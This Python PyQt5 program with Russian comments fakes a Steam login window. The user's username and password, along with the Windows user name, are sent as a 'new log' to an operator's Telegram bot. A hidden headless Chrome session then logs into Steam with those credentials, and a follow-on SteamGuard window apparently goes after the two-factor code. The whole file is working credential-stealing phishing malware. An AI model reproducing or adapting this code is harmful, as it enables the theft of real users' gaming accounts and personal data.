import sys, config, send
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QPixmap, QPainter, QColor, QPen, QFont
from PyQt5.QtWidgets import QApplication, QLabel, QWidget, QLineEdit, QPushButton
from os import system
from time import sleep
from requests import get
from subprocess import CREATE_NO_WINDOW
from getpass import getuser
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service as ChromeService
from telebot import TeleBot
from webdriver_manager.chrome import ChromeDriverManager

import win32gui

def hide_window_by_name(process_name):
    def enum_windows_callback(hwnd, process_name):
        # Проверяем, принадлежит ли окно указанному процессу
        if process_name in win32gui.GetWindowText(hwnd):
            # Скрываем окно процесса
            win32gui.ShowWindow(hwnd, 0)  # 0 - SW_HIDE

    # Обходим все окна
    win32gui.EnumWindows(enum_windows_callback, process_name)

class LoginThread(QThread):
    login_completed = pyqtSignal()

    def __init__(self, login, password, driver):
        super().__init__()
        self.login = login
        self.password = password
        self.driver = driver

    def run(self):

        self.driver.get('https://store.steampowered.com/login/')

        username_input = WebDriverWait(self.driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div[7]/div[6]/div/div[1]/div/div/div/div[2]/div/form/div[1]/input')))
        password_input = WebDriverWait(self.driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div[7]/div[6]/div/div[1]/div/div/div/div[2]/div/form/div[2]/input')))

        username_input.send_keys(self.login)
        password_input.send_keys(self.password)

        log_in = WebDriverWait(self.driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div[7]/div[6]/div/div[1]/div/div/div/div[2]/div/form/div[4]/button')))
        log_in.click()

        try:
            invalid = WebDriverWait(self.driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div[7]/div[6]/div/div[1]/div/div/div/div[2]/div/form/div[5]')))
            print(invalid.text)
        except Exception as er:
            print(er)
        
        sleep(5)
        self.login_completed.emit()

class SteamApp(QWidget):
    def __init__(self):
        super().__init__()

        self.op = webdriver.ChromeOptions()
        self.op.add_argument("--window-size=1920,1080")
        self.op.add_argument("--start-maximized")
        self.op.add_argument("--disable-extensions") 
        self.op.headless = True
        self.serv = ChromeService(ChromeDriverManager().install())
        self.serv.creationflags = CREATE_NO_WINDOW
        self.driver = webdriver.Chrome(service=self.serv, options=self.op)

        hide_window_by_name('chromedriver.exe')

        # Загрузка изображения
        response = get('https://sun9-76.userapi.com/impg/Y90D-R1YvR0by1kpPajRKIP70lelCmiX4bHP-g/Z-bxFag3Bq8.jpg?size=706x434&quality=96&sign=1abc3453d771f7a7e946652e5926993c&type=album')
        image_data = response.content

        # Создание объекта QPixmap из загруженных данных изображения
        pixmap = QPixmap()
        pixmap.loadFromData(image_data)

        # Присвоение созданного QPixmap атрибуту background
        self.background = pixmap

        self.label = QLabel(self)
        self.label.setPixmap(self.background)

        # Создаем экземпляр шрифта Arial
        font = QFont("Arial")

        # Устанавливаем стиль для всего виджета
        self.setStyleSheet("QWidget { font-family: Arial; }")

        # Задаем начальные координаты и размеры окна
        self.setGeometry(100, 100, self.background.width(), self.background.height())

        # Устанавливаем стиль окна без рамки
        self.setWindowFlags(Qt.FramelessWindowHint)

        # Регистрируем обработчики событий мыши
        self.label.mousePressEvent = self.mouse_press_event
        self.label.mouseMoveEvent = self.mouse_move_event

        self.drag_position = None

        # Иницилизируем бота Telegram
        self.bot = TeleBot(config.token)

        # Добавляем форму логина
        self.login_input = QLineEdit(self)
        self.login_input.setGeometry(35, 125, 394, 44)
        self.login_input.setStyleSheet("""
            QLineEdit {
                background-color: #32353c;
                border-radius: 4px;
                padding: 6px;
                color: white;
                font-size: 14px;
            }
            QLineEdit:hover {
                background-color: #393c44;
            }
        """)
        
        # Добавляем форму пароля
        self.password_input = QLineEdit(self)
        self.password_input.setGeometry(35, 203, 394, 44)
        self.password_input.setEchoMode(QLineEdit.Password)
        self.password_input.setStyleSheet("""
            QLineEdit {
                background-color: #32353c;
                border-radius: 4px;
                padding: 6px;
                color: white;
                font-size: 14px;
            }
            QLineEdit:hover {
                background-color: #393c44;
            }
        """)

        # Добавляем кнопку "Войти"
        self.login_button = QPushButton("Войти", self)
        self.login_button.setGeometry(92, 290, 283, 58)
        self.login_button.clicked.connect(self.login)
        self.login_button.setStyleSheet("""
            QPushButton {
                background-color: #0fadff;
                border: 1px solid #565a5f;
                border-radius: 4px;
                padding: 6px;
                color: white;
                font-size: 18px;
            }
            QPushButton:hover {
                background-color: #4dbdff;
            }
        """)

        # Добавляем форму восстановления
        self.help = QLabel("Помогите, я не могу войти в аккаунт", self)
        self.help.setGeometry(30, 400, 800, 30)
        self.help.setStyleSheet("""
            color: #A9A9A9;
            font-size: 12px;
            text-decoration: underline;
            cursor: arrow;
        """)
        self.help.mousePressEvent = self.help_clicked

        # Добавляем форму регистрации
        self.reg = QLabel("Нет аккаунта Steam? Создайте бесплатный аккаунт", self)
        self.reg.setGeometry(350, 400, 800, 30)
        self.reg.setStyleSheet("""
            color: #A9A9A9;
            font-size: 12px;
            text-decoration: underline;
            cursor: arrow;
        """)
        self.reg.mousePressEvent = self.create_clicked

    def send_message(self, message):
        self.bot.send_message(config.my_id, message)

    def help_clicked(self, event):
        system('start https://help.steampowered.com/ru/wizard/HelpWithLogin?redir=clientlogin')

    def create_clicked(self, event):
        system('start https://store.steampowered.com/join/')

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.drawPixmap(self.rect(), self.background)

        # Рисуем закругленные углы и белую обводку
        painter.setPen(QPen(QColor(255, 255, 255), 2))
        painter.drawRoundedRect(self.login_input.geometry().adjusted(-1, -1, 1, 1), 4, 4)
        painter.drawRoundedRect(self.password_input.geometry().adjusted(-1, -1, 1, 1), 4, 4)
        painter.drawRoundedRect(self.login_button.geometry().adjusted(-1, -1, 1, 1), 4, 4)
        
    def mouse_press_event(self, event):
        # Проверяем, если клик был сделан в верхней части окна
        if event.y() <= 30:
            self.drag_position = event.globalPos() - self.frameGeometry().topLeft()
        else:
            self.drag_position = None
        if event.button() == Qt.LeftButton and event.x() >= self.width() - 30 and event.y() <= 30:
            sys.exit()  # Закрываем приложение
    
    def mouse_move_event(self, event):
        if self.drag_position:
            self.move(event.globalPos() - self.drag_position)
    
    def close_app(self, event):
        # Проверяем, если клик был сделан в правом верхнем углу окна
        if event.x() >= self.width() - 30 and event.y() <= 30:
            sys.exit()  # Закрываем приложение

    def login(self):

        # Получаем введенные значения логина и пароля
        login = self.login_input.text()
        password = self.password_input.text()
        # Отправка логина и пароля
        self.send_message(f'''🔥 Новый лог
👥 Пользователь {getuser()}
👥 Логин: {login}
⚙ Пароль: {password}''')
        # Create and start the login thread
        self.login_thread = LoginThread(login, password, self.driver)
        self.login_thread.start()

        self.hide()
        send.steam_app = send.SteamGuard(login)
        send.steam_app.show()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    steam_app = SteamApp()
    steam_app.show()
    sys.exit(app.exec_())